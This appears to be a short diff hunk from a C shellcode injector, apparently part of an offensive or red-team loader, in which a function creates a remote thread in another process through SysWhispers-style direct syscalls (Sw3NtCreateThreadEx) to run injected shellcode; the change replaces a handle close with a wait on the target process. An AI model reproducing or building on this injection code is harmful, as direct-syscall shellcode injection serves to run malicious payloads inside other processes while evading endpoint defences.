@@ -158,8 +158,8 @@ void inject_shellcode_procname_syscalls(unsigned char *shellcode, int shellcode_
     DEBUG_PRINT("Creating new remote thread to execute shellcode...\n");
     Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)remote_process_buffer, NULL, FALSE, NULL, NULL, NULL, NULL);
 
-    Sw3NtClose(hThread);
+	WaitForSingleObject(hProc, INFINITE);
 
-    // Close handle of the opened process
-	Sw3NtClose(hProc);
+	// Close handle of the opened process
+	CloseHandle(hProc);
 }
